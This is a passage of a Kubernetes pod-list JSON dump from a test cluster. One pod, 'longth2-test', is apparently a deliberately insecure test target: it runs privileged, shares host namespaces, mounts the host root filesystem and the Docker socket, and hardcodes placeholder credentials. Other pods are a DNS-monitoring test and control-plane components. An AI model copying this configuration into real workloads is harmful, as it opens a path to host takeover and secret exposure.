31d877da40551356a74fcf68266b54f7199a44cb5a213a42","started":true,"volumeMounts":[{"name":"host","mountPath":"/host"},{"name":"kube-api-access-nl2gm","mountPath":"/var/run/secrets/kubernetes.io/serviceaccount","readOnly":true,"recursiveReadOnly":"Disabled"}]}],"qosClass":"BestEffort"}},{"metadata":{"name":"longth2-test","namespace":"default","uid":"dbef0428-8beb-4d4a-a7c4-3dd0ff82d4fe","resourceVersion":"371591","creationTimestamp":"2026-03-03T03:33:06Z","labels":{"app":"longth2-test","environment":"test"},"annotations":{"kubectl.kubernetes.io/last-applied-configuration":"{\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"annotations\":{},\"labels\":{\"app\":\"longth2-test\",\"environment\":\"test\"},\"name\":\"longth2-test\",\"namespace\":\"default\"},\"spec\":{\"automountServiceAccountToken\":true,\"containers\":[{\"command\":[\"sleep\",\"infinity\"],\"env\":[{\"name\":\"DB_PASSWORD\",\"value\":\"SuperSecretPassword123!\"},{\"name\":\"API_KEY\",\"value\":\"sk-1234567890abcdef\"},{\"name\":\"AWS_SECRET_ACCESS_KEY\",\"value\":\"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\"},{\"name\":\"MYSQL_ROOT_PASSWORD\",\"value\":\"root123\"},{\"name\":\"REDIS_PASSWORD\",\"value\":\"redis_secret_123\"},{\"name\":\"ADMIN_TOKEN\",\"value\":\"admin_token_super_secret\"}],\"image\":\"alpine:latest\",\"name\":\"longth2-evil-container\",\"securityContext\":{\"allowPrivilegeEscalation\":true,\"capabilities\":{\"add\":[\"SYS_ADMIN\",\"NET_ADMIN\",\"SYS_PTRACE\",\"DAC_OVERRIDE\",\"SETUID\",\"SETGID\"]},\"privileged\":true,\"readOnlyRootFilesystem\":false,\"runAsNonRoot\":false,\"runAsUser\":0},\"volumeMounts\":[{\"mountPath\":\"/host\",\"name\":\"host-root\",\"readOnly\":false},{\"mountPath\":\"/host-etc\",\"name\":\"host-etc\",\"readOnly\":false},{\"mountPath\":\"/var/run/docker.sock\",\"name\":\"docker-socket\",\"readOnly\":false}]}],\"hostIPC\":true,\"hostNetwork\":true,\"hostPID\":true,\"initContainers\":[{\"command\":[\"sh\",\"-c\",\"echo 'init done'\"],\"env\":[{\"name\":\"INIT_SECRET\",\"value\":\"init_secret_hardcoded\"}],\"image\":\"alpine:latest\",\"name\":\"longth2-init-evil\",\"securityContext\":{\"capabilities\":{\"add\":[\"SYS_ADMIN\"]},\"privileged\":true}}],\"serviceAccountName\":\"longth2-evil-sa\",\"volumes\":[{\"hostPath\":{\"path\":\"/\",\"type\":\"Directory\"},\"name\":\"host-root\"},{\"hostPath\":{\"path\":\"/etc\",\"type\":\"Directory\"},\"name\":\"host-etc\"},{\"hostPath\":{\"path\":\"/var/run\",\"type\":\"Directory\"},\"name\":\"host-var-run\"},{\"hostPath\":{\"path\":\"/var/run/docker.sock\",\"type\":\"Socket\"},\"name\":\"docker-socket\"}]}}\n","kubernetes.io/config.seen":"2026-03-30T02:05:02.211824107Z","kubernetes.io/config.source":"api"},"managedFields":[{"manager":"kubectl-client-side-apply","operation":"Update","apiVersion":"v1","time":"2026-03-03T03:33:06Z","fieldsType":"FieldsV1","fieldsV1":{"f:metadata":{"f:annotations":{".":{},"f:kubectl.kubernetes.io/last-applied-configuration":{}},"f:labels":{".":{},"f:app":{},"f:environment":{}}},"f:spec":{"f:automountServiceAccountToken":{},"f:containers":{"k:{\"name\":\"longth2-evil-container\"}":{".":{},"f:command":{},"f:env":{".":{},"k:{\"name\":\"ADMIN_TOKEN\"}":{".":{},"f:name":{},"f:value":{}},"k:{\"name\":\"API_KEY\"}":{".":{},"f:name":{},"f:value":{}},"k:{\"name\":\"AWS_SECRET_ACCESS_KEY\"}":{".":{},"f:name":{},"f:value":{}},"k:{\"name\":\"DB_PASSWORD\"}":{".":{},"f:name":{},"f:value":{}},"k:{\"name\":\"MYSQL_ROOT_PASSWORD\"}":{".":{},"f:name":{},"f:value":{}},"k:{\"name\":\"REDIS_PASSWORD\"}":{".":{},"f:name":{},"f:value":{}}},"f:image":{},"f:imagePullPolicy":{},"f:name":{},"f:resources":{},"f:securityContext":{".":{},"f:allowPrivilegeEscalation":{},"f:capabilities":{".":{},"f:add":{}},"f:privileged":{},"f:readOnlyRootFilesystem":{},"f:runAsNonRoot":{},"f:runAsUser":{}},"f:terminationMessagePath":{},"f:terminationMessagePolicy":{},"f:volumeMounts":{".":{},"k:{\"mountPath\":\"/host\"}":{".":{},"f:mountPath":{},"f:name":{}},"k:{\"mountPath\":\"/host-etc\"}":{".":{},"f:mountPath":{},"f:name":{}},"k:{\"mountPath\":\"/var/run/docker.sock\"}":{".":{},"f:mountPath":{},"f:name":{}}}}},"f:dnsPolicy":{},"f:enableServiceLinks":{},"f:hostIPC":{},"f:hostNetwork":{},"f:hostPID":{},"f:initContainers":{".":{},"k:{\"name\":\"longth2-init-evil\"}":{".":{},"f:command":{},"f:env":{".":{},"k:{\"name\":\"INIT_SECRET\"}":{".":{},"f:name":{},"f:value":{}}},"f:image":{},"f:imagePullPolicy":{},"f:name":{},"f:resources":{},"f:securityContext":{".":{},"f:capabilities":{".":{},"f:add":{}},"f:privileged":{}},"f:terminationMessagePath":{},"f:terminationMessagePolicy":{}}},"f:restartPolicy":{},"f:schedulerName":{},"f:securityContext":{},"f:serviceAccount":{},"f:serviceAccountName":{},"f:terminationGracePeriodSeconds":{},"f:volumes":{".":{},"k:{\"name\":\"docker-socket\"}":{".":{},"f:hostPath":{".":{},"f:path":{},"f:type":{}},"f:name":{}},"k:{\"name\":\"host-etc\"}":{".":{},"f:hostPath":{".":{},"f:path":{},"f:type":{}},"f:name":{}},"k:{\"name\":\"host-root\"}":{".":{},"f:hostPath":{".":{},"f:path":{},"f:type":{}},"f:name":{}},"k:{\"name\":\"host-var-run\"}":{".":{},"f:hostPath":{".":{},"f:path":{},"f:type":{}},"f:name":{}}}}}},{"manager":"kubelet","operation":"Update","apiVersion":"v1","time":"2026-03-27T06:57:30Z","fieldsType":"FieldsV1","fieldsV1":{"f:status":{"f:conditions":{"k:{\"type\":\"ContainersReady\"}":{".":{},"f:lastProbeTime":{},"f:lastTransitionTime":{},"f:status":{},"f:type":{}},"k:{\"type\":\"Initialized\"}":{".":{},"f:lastProbeTime":{},"f:lastTransitionTime":{},"f:status":{},"f:type":{}},"k:{\"type\":\"PodReadyToStartContainers\"}":{".":{},"f:lastProbeTime":{},"f:lastTransitionTime":{},"f:status":{},"f:type":{}},"k:{\"type\":\"Ready\"}":{".":{},"f:lastProbeTime":{},"f:lastTransitionTime":{},"f:status":{},"f:type":{}}},"f:containerStatuses":{},"f:hostIP":{},"f:hostIPs":{},"f:initContainerStatuses":{},"f:phase":{},"f:podIP":{},"f:podIPs":{".":{},"k:{\"ip\":\"192.168.213.128\"}":{".":{},"f:ip":{}}},"f:startTime":{}}},"subresource":"status"}]},"spec":{"volumes":[{"name":"host-root","hostPath":{"path":"/","type":"Directory"}},{"name":"host-etc","hostPath":{"path":"/etc","type":"Directory"}},{"name":"host-var-run","hostPath":{"path":"/var/run","type":"Directory"}},{"name":"docker-socket","hostPath":{"path":"/var/run/docker.sock","type":"Socket"}},{"name":"kube-api-access-wpm76","projected":{"sources":[{"serviceAccountToken":{"expirationSeconds":3607,"path":"token"}},{"configMap":{"name":"kube-root-ca.crt","items":[{"key":"ca.crt","path":"ca.crt"}]}},{"downwardAPI":{"items":[{"path":"namespace","fieldRef":{"apiVersion":"v1","fieldPath":"metadata.namespace"}}]}}],"defaultMode":420}}],"initContainers":[{"name":"longth2-init-evil","image":"alpine:latest","command":["sh","-c","echo 'init done'"],"env":[{"name":"INIT_SECRET","value":"init_secret_hardcoded"}],"resources":{},"volumeMounts":[{"name":"kube-api-access-wpm76","readOnly":true,"mountPath":"/var/run/secrets/kubernetes.io/serviceaccount"}],"terminationMessagePath":"/dev/termination-log","terminationMessagePolicy":"File","imagePullPolicy":"Always","securityContext":{"capabilities":{"add":["SYS_ADMIN"]},"privileged":true}}],"containers":[{"name":"longth2-evil-container","image":"alpine:latest","command":["sleep","infinity"],"env":[{"name":"DB_PASSWORD","value":"SuperSecretPassword123!"},{"name":"API_KEY","value":"sk-1234567890abcdef"},{"name":"AWS_SECRET_ACCESS_KEY","value":"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"},{"name":"MYSQL_ROOT_PASSWORD","value":"root123"},{"name":"REDIS_PASSWORD","value":"redis_secret_123"},{"name":"ADMIN_TOKEN","value":"admin_token_super_secret"}],"resources":{},"volumeMounts":[{"name":"host-root","mountPath":"/host"},{"name":"host-etc","mountPath":"/host-etc"},{"name":"docker-socket","mountPath":"/var/run/docker.sock"},{"name":"kube-api-access-wpm76","readOnly":true,"mountPath":"/var/run/secrets/kubernetes.io/serviceaccount"}],"terminationMessagePath":"/dev/termination-log","terminationMessagePolicy":"File","imagePullPolicy":"Always","securityContext":{"capabilities":{"add":["SYS_ADMIN","NET_ADMIN","SYS_PTRACE","DAC_OVERRIDE","SETUID","SETGID"]},"privileged":true,"runAsUser":0,"runAsNonRoot":false,"readOnlyRootFilesystem":false,"allowPrivilegeEscalation":true}}],"restartPolicy":"Always","terminationGracePeriodSeconds":30,"dnsPolicy":"ClusterFirst","serviceAccountName":"longth2-evil-sa","serviceAccount":"longth2-evil-sa","automountServiceAccountToken":true,"nodeName":"longth-cluster","hostNetwork":true,"hostPID":true,"hostIPC":true,"securityContext":{},"schedulerName":"default-scheduler","tolerations":[{"key":"node.kubernetes.io/not-ready","operator":"Exists","effect":"NoExecute","tolerationSeconds":300},{"key":"node.kubernetes.io/unreachable","operator":"Exists","effect":"NoExecute","tolerationSeconds":300}],"priority":0,"enableServiceLinks":true,"preemptionPolicy":"PreemptLowerPriority"},"status":{"phase":"Running","conditions":[{"type":"PodReadyToStartContainers","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T02:05:05Z"},{"type":"Initialized","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-03T03:33:15Z"},{"type":"Ready","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T02:05:08Z"},{"type":"ContainersReady","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T02:05:08Z"},{"type":"PodScheduled","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-03T03:33:06Z"}],"hostIP":"192.168.213.128","hostIPs":[{"ip":"192.168.213.128"}],"podIP":"192.168.213.128","podIPs":[{"ip":"192.168.213.128"}],"startTime":"2026-03-03T03:33:06Z","initContainerStatuses":[{"name":"longth2-init-evil","state":{"terminated":{"exitCode":0,"reason":"Completed","startedAt":"2026-03-30T02:05:05Z","finishedAt":"2026-03-30T02:05:05Z","containerID":"containerd://b961e9e525afdbed787443d73e48bb98527fa867a188c5ecaf943caa7147b68d"}},"lastState":{},"ready":true,"restartCount":16,"image":"docker.io/library/alpine:latest","imageID":"docker.io/library/alpine@sha256:25109184c71bdad752c8312a8623239686a9a2071e8825f20acb8f2198c3f659","containerID":"containerd://b961e9e525afdbed787443d73e48bb98527fa867a188c5ecaf943caa7147b68d","started":false,"volumeMounts":[{"name":"kube-api-access-wpm76","mountPath":"/var/run/secrets/kubernetes.io/serviceaccount","readOnly":true,"recursiveReadOnly":"Disabled"}]}],"containerStatuses":[{"name":"longth2-evil-container","state":{"running":{"startedAt":"2026-03-30T02:05:07Z"}},"lastState":{"terminated":{"exitCode":255,"reason":"Unknown","startedAt":"2026-03-27T06:57:29Z","finishedAt":"2026-03-30T02:04:45Z","containerID":"containerd://45a06eafba026cab7e40d5576ef754c1866756d35b541527b06de0683b20355c"}},"ready":true,"restartCount":16,"image":"docker.io/library/alpine:latest","imageID":"docker.io/library/alpine@sha256:25109184c71bdad752c8312a8623239686a9a2071e8825f20acb8f2198c3f659","containerID":"containerd://2ad4c404f3e7aabb8dc874be8e178ae333aa541391814befbce36801828c62c4","started":true,"volumeMounts":[{"name":"host-root","mountPath":"/host"},{"name":"host-etc","mountPath":"/host-etc"},{"name":"docker-socket","mountPath":"/var/run/docker.sock"},{"name":"kube-api-access-wpm76","mountPath":"/var/run/secrets/kubernetes.io/serviceaccount","readOnly":true,"recursiveReadOnly":"Disabled"}]}],"qosClass":"BestEffort"}},{"metadata":{"name":"dirty-test-pod","namespace":"default","uid":"cb5dde69-ad90-4498-b67f-40ba32cc7809","resourceVersion":"336890","creationTimestamp":"2026-03-10T02:22:36Z","labels":{"app":"dirty-test","purpose":"dns-monitoring-test"},"annotations":{"kubectl.kubernetes.io/last-applied-configuration":"{\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"annotations\":{},\"labels\":{\"app\":\"dirty-test\",\"purpose\":\"dns-monitoring-test\"},\"name\":\"dirty-test-pod\",\"namespace\":\"default\"},\"spec\":{\"containers\":[{\"args\":[\"echo \\\"🚀 Dirty Test Pod started at $(date)\\\"\\necho \\\"📦 Available tools: ss, curl, dig, nslookup, tcpdump, nc, jq...\\\"\\n\\n# Process 1: curl every 5s\\n(while true; do\\n  echo \\\"[$(date +%H:%M:%S)] curl google.com\\\"\\n  curl -s -o /dev/null -w \\\"time:%{time_total}s\\\\n\\\" https://google.com\\n  sleep 5\\ndone) \\u0026\\n\\n# Process 2: dig every 7s\\n(while true; do\\n  echo \\\"[$(date +%H:%M:%S)] dig cloudflare.com\\\"\\n  dig +short cloudflare.com @8.8.8.8\\n  sleep 7\\ndone) \\u0026\\n\\n# Process 3: nslookup every 10s\\n(while true; do\\n  echo \\\"[$(date +%H:%M:%S)] nslookup github.com\\\"\\n  nslookup github.com 1.1.1.1\\n  sleep 10\\ndone) \\u0026\\n\\n# Process 4: Python DNS lookup every 15s\\n(while true; do\\n  echo \\\"[$(date +%H:%M:%S)] python socket lookup\\\"\\n  python3 -c \\\"import socket; print(socket.gethostbyname('kubernetes.io'))\\\"\\n  sleep 15\\ndone) \\u0026\\n\\n# Process 5: wget every 20s\\n(while true; do\\n  echo \\\"[$(date +%H:%M:%S)] wget httpbin.org\\\"\\n  wget -q --spider https://httpbin.org/ip\\n  sleep 20\\ndone) \\u0026\\n\\n# Keep alive + show active connections every 30s\\necho \\\"✅ All background jobs started.\\\"\\necho \\\"🔍 Run 'ss -tunap | grep :53' to see DNS-related sockets\\\"\\nwhile true; do\\n  echo \\\"=== $(date +%H:%M:%S) ===\\\"\\n  ss -tunap 2\\u003e/dev/null | grep -E \\\":53|ESTAB\\\" | head -10\\n  sleep 30\\ndone\\n\"],\"command\":[\"/bin/bash\",\"-c\"],\"image\":\"nicolaka/netshoot:latest\",\"name\":\"main\",\"resources\":{\"limits\":{\"cpu\":\"200m\",\"memory\":\"256Mi\"},\"requests\":{\"cpu\":\"100m\",\"memory\":\"128Mi\"}}}],\"restartPolicy\":\"Never\",\"terminationGracePeriodSeconds\":10}}\n","kubernetes.io/config.seen":"2026-03-30T02:05:02.211822501Z","kubernetes.io/config.source":"api"},"managedFields":[{"manager":"kubectl-client-side-apply","operation":"Update","apiVersion":"v1","time":"2026-03-10T02:22:36Z","fieldsType":"FieldsV1","fieldsV1":{"f:metadata":{"f:annotations":{".":{},"f:kubectl.kubernetes.io/last-applied-configuration":{}},"f:labels":{".":{},"f:app":{},"f:purpose":{}}},"f:spec":{"f:containers":{"k:{\"name\":\"main\"}":{".":{},"f:args":{},"f:command":{},"f:image":{},"f:imagePullPolicy":{},"f:name":{},"f:resources":{".":{},"f:limits":{".":{},"f:cpu":{},"f:memory":{}},"f:requests":{".":{},"f:cpu":{},"f:memory":{}}},"f:terminationMessagePath":{},"f:terminationMessagePolicy":{}}},"f:dnsPolicy":{},"f:enableServiceLinks":{},"f:restartPolicy":{},"f:schedulerName":{},"f:securityContext":{},"f:terminationGracePeriodSeconds":{}}}},{"manager":"kubelet","operation":"Update","apiVersion":"v1","time":"2026-03-12T01:35:07Z","fieldsType":"FieldsV1","fieldsV1":{"f:status":{"f:conditions":{"k:{\"type\":\"ContainersReady\"}":{".":{},"f:lastProbeTime":{},"f:lastTransitionTime":{},"f:reason":{},"f:status":{},"f:type":{}},"k:{\"type\":\"Initialized\"}":{".":{},"f:lastProbeTime":{},"f:lastTransitionTime":{},"f:status":{},"f:type":{}},"k:{\"type\":\"PodReadyToStartContainers\"}":{".":{},"f:lastProbeTime":{},"f:lastTransitionTime":{},"f:status":{},"f:type":{}},"k:{\"type\":\"Ready\"}":{".":{},"f:lastProbeTime":{},"f:lastTransitionTime":{},"f:reason":{},"f:status":{},"f:type":{}}},"f:containerStatuses":{},"f:hostIP":{},"f:hostIPs":{},"f:phase":{},"f:startTime":{}}},"subresource":"status"}]},"spec":{"volumes":[{"name":"kube-api-access-bldlz","projected":{"sources":[{"serviceAccountToken":{"expirationSeconds":3607,"path":"token"}},{"configMap":{"name":"kube-root-ca.crt","items":[{"key":"ca.crt","path":"ca.crt"}]}},{"downwardAPI":{"items":[{"path":"namespace","fieldRef":{"apiVersion":"v1","fieldPath":"metadata.namespace"}}]}}],"defaultMode":420}}],"containers":[{"name":"main","image":"nicolaka/netshoot:latest","command":["/bin/bash","-c"],"args":["echo \"🚀 Dirty Test Pod started at $(date)\"\necho \"📦 Available tools: ss, curl, dig, nslookup, tcpdump, nc, jq...\"\n\n# Process 1: curl every 5s\n(while true; do\n  echo \"[$(date +%H:%M:%S)] curl google.com\"\n  curl -s -o /dev/null -w \"time:%{time_total}s\\n\" https://google.com\n  sleep 5\ndone) \u0026\n\n# Process 2: dig every 7s\n(while true; do\n  echo \"[$(date +%H:%M:%S)] dig cloudflare.com\"\n  dig +short cloudflare.com @8.8.8.8\n  sleep 7\ndone) \u0026\n\n# Process 3: nslookup every 10s\n(while true; do\n  echo \"[$(date +%H:%M:%S)] nslookup github.com\"\n  nslookup github.com 1.1.1.1\n  sleep 10\ndone) \u0026\n\n# Process 4: Python DNS lookup every 15s\n(while true; do\n  echo \"[$(date +%H:%M:%S)] python socket lookup\"\n  python3 -c \"import socket; print(socket.gethostbyname('kubernetes.io'))\"\n  sleep 15\ndone) \u0026\n\n# Process 5: wget every 20s\n(while true; do\n  echo \"[$(date +%H:%M:%S)] wget httpbin.org\"\n  wget -q --spider https://httpbin.org/ip\n  sleep 20\ndone) \u0026\n\n# Keep alive + show active connections every 30s\necho \"✅ All background jobs started.\"\necho \"🔍 Run 'ss -tunap | grep :53' to see DNS-related sockets\"\nwhile true; do\n  echo \"=== $(date +%H:%M:%S) ===\"\n  ss -tunap 2\u003e/dev/null | grep -E \":53|ESTAB\" | head -10\n  sleep 30\ndone\n"],"resources":{"limits":{"cpu":"200m","memory":"256Mi"},"requests":{"cpu":"100m","memory":"128Mi"}},"volumeMounts":[{"name":"kube-api-access-bldlz","readOnly":true,"mountPath":"/var/run/secrets/kubernetes.io/serviceaccount"}],"terminationMessagePath":"/dev/termination-log","terminationMessagePolicy":"File","imagePullPolicy":"Always"}],"restartPolicy":"Never","terminationGracePeriodSeconds":10,"dnsPolicy":"ClusterFirst","serviceAccountName":"default","serviceAccount":"default","nodeName":"longth-cluster","securityContext":{},"schedulerName":"default-scheduler","tolerations":[{"key":"node.kubernetes.io/not-ready","operator":"Exists","effect":"NoExecute","tolerationSeconds":300},{"key":"node.kubernetes.io/unreachable","operator":"Exists","effect":"NoExecute","tolerationSeconds":300}],"priority":0,"enableServiceLinks":true,"preemptionPolicy":"PreemptLowerPriority"},"status":{"phase":"Failed","conditions":[{"type":"PodReadyToStartContainers","status":"False","lastProbeTime":null,"lastTransitionTime":"2026-03-12T01:35:06Z"},{"type":"Initialized","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-10T02:22:36Z"},{"type":"Ready","status":"False","lastProbeTime":null,"lastTransitionTime":"2026-03-12T01:35:06Z","reason":"PodFailed"},{"type":"ContainersReady","status":"False","lastProbeTime":null,"lastTransitionTime":"2026-03-12T01:35:06Z","reason":"PodFailed"},{"type":"PodScheduled","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-10T02:22:36Z"}],"hostIP":"192.168.213.128","hostIPs":[{"ip":"192.168.213.128"}],"startTime":"2026-03-10T02:22:36Z","containerStatuses":[{"name":"main","state":{"terminated":{"exitCode":255,"reason":"Unknown","startedAt":"2026-03-10T02:24:27Z","finishedAt":"2026-03-12T01:34:51Z","containerID":"containerd://c9db732dadf899f2f7ae9443d39277f0ae8faedf7c8f9d57c19e212b41c4a955"}},"lastState":{},"ready":false,"restartCount":0,"image":"docker.io/nicolaka/netshoot:latest","imageID":"docker.io/nicolaka/netshoot@sha256:47b907d662d139d1e2f22bfe14f4efca1e3f1feed283572f47c970c780c03b61","containerID":"containerd://c9db732dadf899f2f7ae9443d39277f0ae8faedf7c8f9d57c19e212b41c4a955","started":false,"volumeMounts":[{"name":"kube-api-access-bldlz","mountPath":"/var/run/secrets/kubernetes.io/serviceaccount","readOnly":true,"recursiveReadOnly":"Disabled"}]}],"qosClass":"Burstable"}},{"metadata":{"name":"kube-controller-manager-longth-cluster","namespace":"kube-system","uid":"51fc84c6ad06ba9da007c7753fb5fd9f","creationTimestamp":null,"labels":{"component":"kube-controller-manager","tier":"control-plane"},"annotations":{"kubernetes.io/config.hash":"51fc84c6ad06ba9da007c7753fb5fd9f","kubernetes.io/config.seen":"2026-03-30T02:04:56.212873758Z","kubernetes.io/config.source":"file"}},"spec":{"volumes":[{"name":"ca-certs","hostPath":{"path":"/etc/ssl/certs","type":"DirectoryOrCreate"}},{"name":"etc-ca-certificates","hostPath":{"path":"/etc/ca-certificates","type":"DirectoryOrCreate"}},{"name":"flexvolume-dir","hostPath":{"path":"/usr/libexec/kubernetes/kubelet-plugins/volume/exec","type":"DirectoryOrCreate"}},{"name":"k8s-certs","hostPath":{"path":"/etc/kubernetes/pki","type":"DirectoryOrCreate"}},{"name":"kubeconfig","hostPath":{"path":"/etc/kubernetes/controller-manager.conf","type":"FileOrCreate"}},{"name":"usr-local-share-ca-certificates","hostPath":{"path":"/usr/local/share/ca-certificates","type":"DirectoryOrCreate"}},{"name":"usr-share-ca-certificates","hostPath":{"path":"/usr/share/ca-certificates","type":"DirectoryOrCreate"}}],"containers":[{"name":"kube-controller-manager","image":"registry.k8s.io/kube-controller-manager:v1.31.13","command":["kube-controller-manager","--allocate-node-cidrs=true","--authentication-kubeconfig=/etc/kubernetes/controller-manager.conf","--authorization-kubeconfig=/etc/kubernetes/controller-manager.conf","--bind-address=127.0.0.1","--client-ca-file=/etc/kubernetes/pki/ca.crt","--cluster-cidr=10.244.0.0/16","--cluster-name=kubernetes","--cluster-signing-cert-file=/etc/kubernetes/pki/ca.crt","--cluster-signing-key-file=/etc/kubernetes/pki/ca.key","--controllers=*,bootstrapsigner,tokencleaner","--kubeconfig=/etc/kubernetes/controller-manager.conf","--leader-elect=true","--requestheader-client-ca-file=/etc/kubernetes/pki/front-proxy-ca.crt","--root-ca-file=/etc/kubernetes/pki/ca.crt","--service-account-private-key-file=/etc/kubernetes/pki/sa.key","--service-cluster-ip-range=10.96.0.0/12","--use-service-account-credentials=true"],"resources":{"requests":{"cpu":"200m"}},"volumeMounts":[{"name":"ca-certs","readOnly":true,"mountPath":"/etc/ssl/certs"},{"name":"etc-ca-certificates","readOnly":true,"mountPath":"/etc/ca-certificates"},{"name":"flexvolume-dir","mountPath":"/usr/libexec/kubernetes/kubelet-plugins/volume/exec"},{"name":"k8s-certs","readOnly":true,"mountPath":"/etc/kubernetes/pki"},{"name":"kubeconfig","readOnly":true,"mountPath":"/etc/kubernetes/controller-manager.conf"},{"name":"usr-local-share-ca-certificates","readOnly":true,"mountPath":"/usr/local/share/ca-certificates"},{"name":"usr-share-ca-certificates","readOnly":true,"mountPath":"/usr/share/ca-certificates"}],"livenessProbe":{"httpGet":{"path":"/healthz","port":10257,"host":"127.0.0.1","scheme":"HTTPS"},"initialDelaySeconds":10,"timeoutSeconds":15,"periodSeconds":10,"successThreshold":1,"failureThreshold":8},"startupProbe":{"httpGet":{"path":"/healthz","port":10257,"host":"127.0.0.1","scheme":"HTTPS"},"initialDelaySeconds":10,"timeoutSeconds":15,"periodSeconds":10,"successThreshold":1,"failureThreshold":24},"terminationMessagePath":"/dev/termination-log","terminationMessagePolicy":"File","imagePullPolicy":"IfNotPresent"}],"restartPolicy":"Always","terminationGracePeriodSeconds":30,"dnsPolicy":"ClusterFirst","nodeName":"longth-cluster","hostNetwork":true,"securityContext":{"seccompProfile":{"type":"RuntimeDefault"}},"schedulerName":"default-scheduler","tolerations":[{"operator":"Exists","effect":"NoExecute"}],"priorityClassName":"system-node-critical","priority":2000001000,"enableServiceLinks":true},"status":{"phase":"Running","conditions":[{"type":"PodReadyToStartContainers","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T02:04:57Z"},{"type":"Initialized","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T02:04:56Z"},{"type":"Ready","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T02:05:15Z"},{"type":"ContainersReady","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T02:05:15Z"},{"type":"PodScheduled","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T02:04:56Z"}],"hostIP":"192.168.213.128","hostIPs":[{"ip":"192.168.213.128"}],"podIP":"192.168.213.128","podIPs":[{"ip":"192.168.213.128"}],"startTime":"2026-03-30T02:04:56Z","containerStatuses":[{"name":"kube-controller-manager","state":{"running":{"startedAt":"2026-03-30T02:04:57Z"}},"lastState":{"terminated":{"exitCode":255,"reason":"Unknown","startedAt":"2026-03-27T06:57:14Z","finishedAt":"2026-03-30T02:04:45Z","containerID":"containerd://bf3bb95e4b3284a12c6278a6bbae34a1c7a44d490ab121a2eb51e4314accef36"}},"ready":true,"restartCount":50,"image":"registry.k8s.io/kube-controller-manager:v1.31.13","imageID":"registry.k8s.io/kube-controller-manager@sha256:facc91288697a288a691520949fe4eec40059ef065c89da8e10481d14e131b09","containerID":"containerd://4f49437261df530f40add82ad0549789fa6c4c94f7aff3608e4644e60d4ec3a3","started":true}],"qosClass":"Burstable"}},{"metadata":{"name":"kube-apiserver-longth-cluster","namespace":"kube-system","uid":"0a496d350fe2e4aa172073767453af3b","creationTimestamp":null,"labels":{"component":"kube-apiserver","tier":"control-plane"},"annotations":{"kubeadm.kubernetes.io/kube-apiserver.advertise-address.endpoint":"192.168.213.128:6443","kubernetes.io/config.hash":"0a496d350fe2e4aa172073767453af3b","kubernetes.io/config.seen":"2026-03-30T02:04:56.212878049Z","kubernetes.io/config.source":"file"}},"spec":{"volumes":[{"name":"ca-certs","hostPath":{"path":"/etc/ssl/certs","type":"DirectoryOrCreate"}},{"name":"etc-ca-certificates","hostPath":{"path":"/etc/ca-certificates","type":"DirectoryOrCreate"}},{"name":"k8s-certs","hostPath":{"path":"/etc/kubernetes/pki","type":"DirectoryOrCreate"}},{"name":"usr-local-share-ca-certificates","hostPath":{"path":"/usr/local/share/ca-certificates","type":"DirectoryOrCreate"}},{"name":"usr-share-ca-certificates","hostPath":{"path":"/usr/share/ca-certificates","type":"DirectoryOrCreate"}},{"name":"audit-policy","hostPath":{"path":"/etc/kubernetes/audit","type":"DirectoryOrCreate"}},{"name":"audit-log","hostPath":{"path":"/var/log/kubernetes","type":"DirectoryOrCreate"}}],"containers":[{"name":"kube-apiserver","image":"registry.k8s.io/kube-apiserver:v1.31.13","command":["kube-apiserver","--audit-log-maxsize=200","--audit-log-format=json","--advertise-address=192.168.213.128","--secure-port=6443","--allow-privileged=true","--authorization-mode=Node,RBAC","--enable-admission-plugins=NodeRestriction","--enable-bootstrap-token-auth=true","--client-ca-file=/etc/kubernetes/pki/ca.crt","--tls-cert-file=/etc/kubernetes/pki/apiserver.crt","--tls-private-key-file=/etc/kubernetes/pki/apiserver.key","--etcd-servers=https://127.0.0.1:2379","--etcd-cafile=/etc/kubernetes/pki/etcd/ca.crt","--etcd-certfile=/etc/kubernetes/pki/apiserver-etcd-client.crt","--etcd-keyfile=/etc/kubernetes/pki/apiserver-etcd-client.key","--kubelet-client-certificate=/etc/kubernetes/pki/apiserver-kubelet-client.crt","--kubelet-client-key=/etc/kubernetes/pki/apiserver-kubelet-client.key","--kubelet-preferred-address-types=InternalIP,ExternalIP,Hostname","--service-account-issuer=https://kubernetes.default.svc.cluster.local","--service-account-key-file=/etc/kubernetes/pki/sa.pub","--service-account-signing-key-file=/etc/kubernetes/pki/sa.key","--service-cluster-ip-range=10.96.0.0/12","--proxy-client-cert-file=/etc/kubernetes/pki/front-proxy-client.crt","--proxy-client-key-file=/etc/kubernetes/pki/front-proxy-client.key","--requestheader-client-ca-file=/etc/kubernetes/pki/front-proxy-ca.crt","--requestheader-allowed-names=front-proxy-client","--requestheader-username-headers=X-Remote-User","--requestheader-group-headers=X-Remote-Group","--requestheader-extra-headers-prefix=X-Remote-Extra-","--audit-policy-file=/etc/kubernetes/audit/audit-policy.yaml","--audit-log-path=/var/log/kubernetes/audit.log","--audit-log-maxage=7","--audit-log-maxbackup=10","--audit-log-maxsize=100"],"resources":{"requests":{"cpu":"250m"}},"volumeMounts":[{"name":"ca-certs","readOnly":true,"mountPath":"/etc/ssl/certs"},{"name":"etc-ca-certificates","readOnly":true,"mountPath":"/etc/ca-certificates"},{"name":"k8s-certs","readOnly":true,"mountPath":"/etc/kubernetes/pki"},{"name":"usr-local-share-ca-certificates","readOnly":true,"mountPath":"/usr/local/share/ca-certificates"},{"name":"usr-share-ca-certificates","readOnly":true,"mountPath":"/usr/share/ca-certificates"},{"name":"audit-policy","readOnly":true,"mountPath":"/etc/kubernetes/audit"},{"name":"audit-log","mountPath":"/var/log/kubernetes"}],"livenessProbe":{"httpGet":{"path":"/livez","port":6443,"host":"192.168.213.128","